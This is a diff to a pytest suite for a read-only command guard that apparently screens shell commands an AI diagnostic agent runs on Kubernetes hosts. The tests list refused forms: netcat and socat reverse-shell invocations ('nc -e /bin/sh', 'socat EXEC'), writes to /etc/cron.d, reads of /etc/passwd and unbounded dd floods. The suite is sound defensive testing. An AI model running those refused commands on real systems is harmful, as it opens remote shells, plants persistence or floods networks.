@@ -527,13 +527,45 @@ class TestDdReadingIntoDiscard:
         assert not is_readonly_host_command(cmd), cmd
 
     @pytest.mark.parametrize("cmd", [
+        # No ``of=`` at all: the bytes stream to stdout, which for a probe is a
+        # pipe. Bounded by ``count=``, so it is a throughput feeder, not a flood
+        # — the ``dd`` stage of ``dd if=/dev/zero bs=1M count=100 | nc HOST PORT``
+        # (judged here as the single stage host_read sees; the pipe itself is the
+        # exec-script gate's concern — see TestSameVerdictThroughKubectlExec).
+        "dd if=/dev/zero bs=1M count=100",
+        "dd if=/etc/hostname bs=1M count=1",
+        "dd if=/data/f bs=64k count=16 iflag=direct",
+    ])
+    def test_bounded_pipe_source_is_readonly(self, cmd):
+        assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+    @pytest.mark.parametrize("cmd", [
+        # No ``of=`` AND no ``count=`` streams forever: unbounded == a flood, the
+        # same category as ``ping -f``.
+        "dd if=/dev/zero bs=1M",
+        "dd if=/dev/zero",
+        # ``count=`` present but bs*count exceeds the bounded-probe budget, or the
+        # size cannot be parsed — both fail closed (the bound is unconfirmed).
+        "dd if=/dev/zero bs=1M count=1000",
+        "dd if=/dev/zero bs=1M count=1e6",
+    ])
+    def test_unbounded_or_oversize_pipe_source_refused(self, cmd):
+        assert not is_readonly_host_command(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", [
         "stress-ng --cpu 1 --timeout 1s",
         "fallocate -l 5G /tmp/f",
         "fio --name=t --rw=write --size=1G",
-        "nc -zv svc 80",
     ])
     def test_the_dd_carve_out_does_not_leak_to_its_neighbours(self, cmd):
-        """dd's exemption is keyed on its own operands, not on the set."""
+        """dd's exemption is keyed on its own operands, not on the set.
+
+        ``nc``/``ncat`` and ``socat`` are no longer neighbours refused wholesale
+        — each earned its own argument-level carve-out (see
+        TestNcProbeVersusModeSwitch and TestSocatProbeVersusModeSwitch). What
+        remains here are the pure load generators / file writers with NO
+        read-only probe form at all, so they stay refused outright.
+        """
         assert not is_readonly_host_command(cmd), cmd
 
 
@@ -627,6 +659,63 @@ class TestDmesgRingBufferClear:
     ])
     def test_reading_still_readonly(self, cmd):
         assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+
+class TestDmsetupVerbSplit:
+    """``dmsetup`` is dual-use: the query verbs READ the mapping tables,
+    every other verb EDITS them.
+
+    The whole binary used to sit in ``_MUTATING_BINARIES``. That refused the
+    IO-error case's injection (``dmsetup create``) as intended, but it also
+    refused the case's own recovery verification (``dmsetup ls`` / ``info``)
+    — leaving no read-only form at all to confirm a mapping, while the
+    mutation it was meant to confirm stayed refused either way. The split
+    keeps every mutation verb refused.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        "dmsetup ls",
+        "dmsetup ls --tree",
+        "dmsetup info error-device",
+        "dmsetup table error-device",
+        "dmsetup status",
+        "dmsetup targets",
+        "dmsetup --version",
+    ])
+    def test_query_verbs_are_readonly(self, cmd):
+        assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+    @pytest.mark.parametrize("cmd", [
+        "dmsetup create error-device",
+        "dmsetup create error-device --table '0 1024 error'",
+        "echo '0 1024 error' | dmsetup create error-device",
+        "dmsetup remove error-device",
+        "dmsetup remove -f error-device",
+        "dmsetup wipe_table error-device",
+        "dmsetup reload error-device",
+        "dmsetup suspend error-device",
+    ])
+    def test_mutation_verbs_stay_refused(self, cmd):
+        assert not is_readonly_host_command(cmd), cmd
+
+    def test_rejection_names_the_verb(self):
+        # The refusal routes the model to the legal query form: it must name
+        # what was refused and what still reads.
+        reason = host_command_rejection_reason("dmsetup create error-device")
+        assert reason is not None
+        assert "create" in reason
+        assert "query verbs" in reason
+        assert "info" in reason
+
+    def test_kubectl_exec_inner_uses_the_same_split(self):
+        # The same judge decides whether a kubectl exec inner command may run
+        # (call path 3 of four) — the injection form stays refused there too.
+        assert not is_readonly_kubectl_exec(
+            "node-debugger-abc -n kubewiz -- dmsetup create error-device"
+        )
+        assert is_readonly_kubectl_exec(
+            "node-debugger-abc -n kubewiz -- dmsetup ls"
+        )
 
 
 class TestCommandRunsWhatItResolves:
@@ -852,6 +941,120 @@ class TestArpingSpoofAndDigBulkExfil:
         "traceroute 10.0.0.1",                        # accepted probe class
     ])
     def test_probe_forms_still_readonly(self, cmd):
+        assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+
+class TestNcProbeVersusModeSwitch:
+    """``nc``/``ncat`` sat in ``_MUTATING_BINARIES`` refused wholesale, which
+    left a bandwidth drill no way to measure injected throughput: the standard
+    probe ``dd if=/dev/zero bs=1M count=100 | nc HOST PORT`` sends a bounded
+    stream and reads the reply — send packets, mutate nothing, the same class as
+    ``ping``/``traceroute``/``arping -c``.
+
+    The dual-use danger is a SMALL, KNOWN set of mode-switch flags, and per the
+    B76 "the mode switch IS the write surface" principle (arping ``-U``/``-A``)
+    those are what get refused — not the connect-and-send probe:
+
+    - ``-l``/``--listen`` binds a server socket (the pivot of a reverse-shell
+      listener); ``-k``/``--keep-open`` keeps it persistent;
+    - ``-e``/``--exec``/``-c``/``--sh-exec`` runs a program == container escape;
+    - ``-o``/``--output`` lands the reply in a file == residual write;
+    - ``-b``/``--broadcast`` floods the subnet.
+
+    Output REDIRECTION (``nc HOST PORT > file``) is refused by the shell-level
+    redirect scan, not here — that is the redirect gate's job, not nc's.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        "nc -l 5201",                              # listen: binds a server port
+        "nc --listen 5201",
+        "nc -l -p 5201",
+        "nc -k -l 5201",                           # persistent listener
+        "nc --keep-open -l 5201",
+        "nc -e /bin/sh 10.0.0.1 5201",             # exec: reverse shell / escape
+        "nc --exec /bin/sh 10.0.0.1 5201",
+        "nc -c /bin/sh 10.0.0.1 5201",             # sh-exec
+        "nc --sh-exec /bin/sh 10.0.0.1 5201",
+        "nc -e/bin/sh 10.0.0.1 5201",              # attached value
+        "nc -le /bin/sh 10.0.0.1 5201",            # bundled listen+exec
+        "nc -o /tmp/recv 10.0.0.1 5201",           # output lands in a file
+        "nc --output /tmp/recv 10.0.0.1 5201",
+        "nc -b 10.0.0.255 5201",                   # subnet broadcast
+        "nc --broadcast 10.0.0.255 5201",
+        "ncat -l 5201",                            # ncat shares the guard
+        "ncat --exec /bin/sh 10.0.0.1 5201",
+    ])
+    def test_mode_switch_forms_rejected(self, cmd):
+        assert not is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+    @pytest.mark.parametrize("cmd", [
+        "nc 10.0.0.1 5201",                        # plain connect-and-send probe
+        "nc -zv svc 80",                           # zero-I/O port scan
+        "nc -vz 10.0.0.1 5201",                    # bundled valueless flags
+        "nc -w 3 10.0.0.1 5201",                   # connect timeout (value consumed)
+        "nc -u 10.0.0.1 5201",                     # UDP probe
+        "nc -n -v 10.0.0.1 5201",                  # no-DNS + verbose
+        "nc --send-only 10.0.0.1 5201",            # restricts, does not mutate
+        "ncat 10.0.0.1 5201",
+    ])
+    def test_connect_probe_forms_still_readonly(self, cmd):
+        assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+
+class TestSocatProbeVersusModeSwitch:
+    """``socat`` sat in ``_MUTATING_BINARIES`` refused wholesale, which left a
+    bandwidth drill on a CNI/minimal image (terway/calico/cilium ship socat but
+    NOT nc) no way to measure injected throughput: the probe
+    ``dd if=/dev/zero bs=1M count=100 | socat - TCP:HOST:PORT`` sends a bounded
+    stream and mutates nothing — the same class as nc's connect-and-send probe
+    (see TestNcProbeVersusModeSwitch).
+
+    Unlike nc, whose danger is a small set of mode-switch FLAGS, socat's danger
+    is carried ENTIRELY by the two ADDRESS TYPES, so the guard is an ADDRESS
+    ALLOWLIST (fail-closed): read-only only when BOTH addresses are a known
+    outbound-connect (TCP/UDP*) or stdio endpoint. Every mutating type stays
+    refused:
+
+    - ``*-LISTEN`` (TCP-LISTEN/UDP-LISTEN/UNIX-LISTEN) binds a server socket;
+    - ``EXEC``/``SYSTEM`` runs a program == reverse shell / container escape;
+    - ``CREATE``/``GOPEN``/``FILE`` write or open a file == residual write;
+    - ``TUN`` creates a network interface;
+    - a log-writing global option (``-lf``/``-lm``/``-lu``) lands a logfile.
+
+    The head before the first ``:`` is matched EXACTLY, so ``TCP-LISTEN`` never
+    matches the ``TCP`` connect entry. Output REDIRECTION to a file is refused by
+    the shell-level redirect scan, not here.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        "socat TCP-LISTEN:5201,reuseaddr,fork:/dev/null",  # binds a server port
+        "socat UDP-LISTEN:5201 -",
+        "socat UNIX-LISTEN:/tmp/s -",
+        "socat EXEC:/bin/sh -",                            # runs a program / escape
+        "socat SYSTEM:'id' -",
+        "socat - CREATE:/tmp/x",                           # creates a file
+        "socat - GOPEN:/tmp/x",                            # opens for write
+        "socat - FILE:/etc/passwd",                        # arbitrary file address
+        "socat - /etc/passwd",                             # bare path address
+        "socat - TUN:10.0.0.1/24",                         # creates an interface
+        "socat -lf/tmp/log - TCP:10.0.0.1:5201",           # log sink writes a file
+        "socat -lm - TCP:10.0.0.1:5201",                   # syslog sink
+        "socat - TCP:10.0.0.1:5201 EXTRA:h:1",             # != 2 addresses
+        "socat TCP:10.0.0.1:5201",                         # only one address
+    ])
+    def test_mode_switch_forms_rejected(self, cmd):
+        assert not is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+    @pytest.mark.parametrize("cmd", [
+        "socat - TCP:10.0.0.1:5201",                       # plain connect-and-send
+        "socat TCP:svc:80 -",                              # connect, reply to stdout
+        "socat - UDP:10.0.0.1:5201",                       # UDP connect probe
+        "socat -u - TCP:10.0.0.1:5201",                    # unidirectional (send-only)
+        "socat -b8192 - TCP:10.0.0.1:5201",                # buffer option (attached)
+        "socat STDIN TCP:10.0.0.1:5201",                   # spelled stdio
+        "socat TCP4:svc:80 STDOUT",                        # IPv4 connect to stdout
+    ])
+    def test_connect_probe_forms_still_readonly(self, cmd):
         assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
 
 
@@ -1170,6 +1373,11 @@ class TestSameVerdictThroughKubectlExec:
         # R41 write faces must hold on this path too.
         "awk -l /tmp/evil.so x",
         "hostname -bF /dev/null",
+        # An unbounded dd pipe source (no count=) feeding nc == a flood, judged
+        # per-stage on the exec path (host_read refuses the pipe itself).
+        "dd if=/dev/zero | nc 10.0.0.1 5201",
+        # Same flood feeding socat (the CNI/minimal-image stand-in for nc).
+        "dd if=/dev/zero | socat - TCP:10.0.0.1:5201",
     ])
     def test_mutating_inner_rejected(self, inner):
         assert not is_readonly_kubectl_exec(f"pod -n default -- {inner}")
@@ -1188,6 +1396,12 @@ class TestSameVerdictThroughKubectlExec:
         "date +%F",
         "hostname -s",
         "awk --gen-pot '{print}'",                     # R41: stdout-only, stays allowed
+        # A BOUNDED dd pipe source feeding nc is a throughput probe: each stage
+        # mutates nothing (dd reads into the pipe, nc sends and prints).
+        "dd if=/dev/zero bs=1M count=100 | nc 10.0.0.1 5201",
+        # Same bounded probe feeding socat — the form a terway/calico image (no
+        # nc) uses to time injected egress throughput.
+        "dd if=/dev/zero bs=1M count=100 | socat - TCP:10.0.0.1:5201",
     ])
     def test_readonly_inner_allowed(self, inner):
         v_args = f"pod -n default -- {inner}"
@@ -2139,3 +2353,113 @@ class TestR43ComposedCommandsAndDashOperands:
         """The facts engine re-uses ``_classify_argv``, so the host path
         (baseline capture / ``host_read``) must reach the identical verdicts."""
         assert not is_readonly_host_command(cmd), cmd
+
+
+class TestBenignStreamRedirects:
+    """A1 (2026-09-21, inject-76f5f317): the exec-probe dialect admits the
+    two stream-only redirect shapes — fd duplication (``2>&1``) and the
+    ``/dev/null`` discard — the shell-level twins of the argument-level
+    ``_DISCARD_SINKS`` carve-out (curl ``-o /dev/null``). The NXDOMAIN case
+    teaches documented probes in exactly this shape (L375/381/387:
+    ``nslookup <domain> 2>&1 | grep``) while the screen refused them — the
+    guard and the knowledge base spoke different dialects, and one stray
+    ``2>/dev/null`` batch-sibling voided all 7 probes of a planning round.
+
+    File-writing redirects, substitutions, background and newlines still
+    fail closed on every surface; the host single-command contract and the
+    ``contains_shell_metachar`` screen keep refusing every redirect.
+    """
+
+    # --- admitted: the two benign shapes (facts engine) ---------------------
+
+    @pytest.mark.parametrize(
+        "inner",
+        [
+            # The exact case-documented probe shapes (batch [177]'s sibling).
+            "sh -c 'nslookup www.aliyun.com 2>&1 | grep -i nxdomain'",
+            "sh -c 'nslookup kubernetes.default.svc.cluster.local 2>&1 | tail -3'",
+            "sh -c 'curl -sv --max-time 5 http://x -o /dev/null 2>&1 | grep Trying'",
+            # fd-duplication variants: 2>&1 / 1>&2 / bare >&2.
+            "sh -c 'cat /proc/diskstats 2>&1 | grep vda'",
+            "sh -c 'df -h >&2 | cat'",
+            # Discard sink: any fd, with or without an explicit one.
+            "sh -c 'curl -s -o /dev/null -w \"%{http_code}\" http://x 2>/dev/null'",
+            "sh -c 'ps aux >/dev/null'",
+            # Both benign shapes together.
+            "sh -c 'df -h 2>&1 >/dev/null'",
+            # Chained probes may carry the benign shapes per segment.
+            "sh -c 'echo ===T===; nsenter -t 1 -m -- df -h 2>&1'",
+        ],
+    )
+    def test_benign_stream_shapes_admitted(self, inner):
+        reason = readonly.kubectl_exec_rejection_reason(f"pod-x -n ns -- {inner}")
+        assert reason is None, reason
+
+    # --- refused: every write-shaped redirect stays fail-closed -------------
+
+    @pytest.mark.parametrize(
+        "inner",
+        [
+            # File writes, every fd/append combination.
+            "sh -c 'cat /etc/passwd > /tmp/x'",
+            "sh -c 'cat /etc/passwd >> /tmp/x'",
+            "sh -c 'cat /etc/passwd 2> /tmp/x'",
+            "sh -c 'cat /etc/passwd 2>> /tmp/x'",
+            # All-or-nothing: one benign sibling never launders a write.
+            "sh -c 'cat /etc/passwd 2>&1 > /etc/cron.d/x'",
+            "sh -c 'cat /etc/passwd 2>/dev/null >/etc/x'",
+            # Old-POSIX `>&file` = `>file 2>&1` — the numeric-literal rule.
+            "sh -c 'cat /etc/passwd >&/etc/x'",
+            # Write-group operators (bashfacts.facts legislated table).
+            "sh -c 'cat /etc/passwd <>/etc/x'",
+            "sh -c 'cat /etc/passwd &>/etc/x'",
+            # Append-to-sink is semantically a discard but unused by real
+            # probes — deliberately NOT in the first carve-out.
+            "sh -c 'cat /etc/passwd >>/dev/null'",
+            # fd-close.
+            "sh -c 'cat /etc/passwd 2>&-'",
+            # Input/heredoc operators stay out of scope.
+            "sh -c 'cat < /etc/passwd'",
+            "sh -c 'cat <<< x'",
+            # Non-literal fd target — 4.6 value discipline.
+            "sh -c 'cat /etc/passwd 2>&$(echo 1)'",
+        ],
+    )
+    def test_write_shaped_redirects_refused(self, inner):
+        reason = readonly.kubectl_exec_rejection_reason(f"pod-x -n ns -- {inner}")
+        assert reason is not None
+
+    def test_refusal_reason_still_names_the_operator_and_pos(self):
+        """The non-benign refusal keeps the anchored wording (operator +
+        pos) so existing message-level consumers keep parsing it."""
+        reason = readonly.kubectl_exec_rejection_reason(
+            "pod-x -n ns -- sh -c 'cat /etc/passwd > /tmp/x'"
+        )
+        assert "contains a shell redirect ('>')" in reason
+        assert "at pos" in reason
+
+    # --- host face + metachar screen: contracts untouched -------------------
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "nslookup x 2>&1 | grep y",
+            "cat /etc/passwd 2>&1",
+            "cat /etc/passwd 2>/dev/null",
+        ],
+    )
+    def test_host_face_still_refuses_every_redirect(self, cmd):
+        """The host contract is a SINGLE diagnostic (pipes are refused
+        there), so admitting a stream merge on that surface would be
+        inconsistent — ``_judge_host_script`` must keep the default."""
+        assert not readonly.is_readonly_host_command(cmd), cmd
+
+    @pytest.mark.parametrize(
+        "cmd",
+        ["cat /etc/passwd 2>&1", "cat /etc/passwd 2>/dev/null"],
+    )
+    def test_metachar_screen_still_sees_the_structure(self, cmd):
+        """``contains_shell_metachar`` answers "does this command carry
+        structure AT ALL?" — orthogonal to read-only-ness; a benign stream
+        op is still structure and must still screen True."""
+        assert readonly.contains_shell_metachar(cmd), cmd
